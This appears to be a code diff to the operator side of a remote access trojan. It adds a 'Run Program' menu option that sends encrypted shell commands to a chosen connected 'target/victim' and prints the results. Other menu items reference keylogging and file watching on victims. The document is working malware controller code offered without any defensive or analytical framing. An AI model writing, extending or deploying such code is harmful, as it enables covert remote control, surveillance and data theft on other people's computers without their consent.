@@ -76,6 +76,91 @@ if __name__ == '__main__':
                 if command == constants.PERFORM_MENU_ITEM_SEVEN:
                     perform_menu_item_7(connected_clients, source_ip, source_port, shared_secret)
 
+                # MENU ITEM 8 -  Run Program
+                if command == constants.PERFORM_MENU_ITEM_EIGHT:
+                    print(constants.START_RUN_PROGRAM_MSG)
+
+                    # CASE 1: Check if client list is empty
+                    if len(connected_clients) == constants.ZERO:
+                        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
+
+                    # CASE 2: Handle single client in client list
+                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
+                        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))
+
+                        # Check status
+                        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+                            # return None
+                        elif is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+                            # return None
+                        else:
+                            # Send signal to target/victim
+                            client_socket.send(encrypt_string(constants.RUN_PROGRAM_SIGNAL, shared_secret).encode())
+
+                            while True:
+                                # Get command from user
+                                command = input(constants.GET_USER_PROMPT_MSG)
+                                if command.lower() == constants.EXIT_RUN_PROGRAM_SIGNAL:
+                                    print(constants.RETURN_MAIN_MENU_MSG)
+                                    print(constants.MENU_CLOSING_BANNER)
+                                    break
+
+                                # Send command to target/victim
+                                client_socket.send(encrypt_string(command, shared_secret).encode())
+
+                                # Receive and print the result from the client
+                                result = decrypt_string(client_socket.recv(4096).decode(), shared_secret)
+                                print(result)
+
+                    # CASE 3: Multiple Clients Handler
+                    elif len(connected_clients) != constants.ZERO:
+                        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
+                        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
+                        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(
+                            connected_clients,
+                            target_ip,
+                            target_port)
+
+                        # Check if target socket is currently running keylogger
+                        if is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+
+                        # Check if file/directory watching
+                        if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+
+                        if target_socket:
+                            # Send signal to target/victim
+                            target_socket.send(encrypt_string(constants.RUN_PROGRAM_SIGNAL, shared_secret).encode())
+
+                            while True:
+                                # Get command from user
+                                command = input(constants.GET_USER_PROMPT_MSG)
+                                if command.lower() == constants.EXIT_RUN_PROGRAM_SIGNAL:
+                                    print(constants.RETURN_MAIN_MENU_MSG)
+                                    print(constants.MENU_CLOSING_BANNER)
+                                    break
+
+                                # Send command to target/victim
+                                target_socket.send(encrypt_string(command, shared_secret).encode())
+
+                                # Receive and print the result from the client
+                                result = decrypt_string(target_socket.recv(4096).decode(), shared_secret)
+                                print(result)
+
+                    print(constants.RETURN_MAIN_MENU_MSG)
+                    print(constants.MENU_CLOSING_BANNER)
+
                 # MENU ITEM 9 - Watch File
                 if command == constants.PERFORM_MENU_ITEM_NINE:
                     global_thread = perform_menu_item_9(connected_clients, global_thread, signal_queue, shared_secret)
@@ -86,7 +171,7 @@ if __name__ == '__main__':
                 if command == constants.PERFORM_MENU_ITEM_ELEVEN:
                     global_thread = perform_menu_item_11(connected_clients, global_thread, signal_queue)
 
-                # MENU ITEM 12 - Connect to a specific victim
+                # MENU ITEM 14 - Connect to a specific victim
                 if command == constants.PERFORM_MENU_ITEM_FOURTEEN:
                     _, target_socket, target_ip, target_port = connect_to_client_with_prompt(sockets_to_read,
                                                                                              connected_clients)
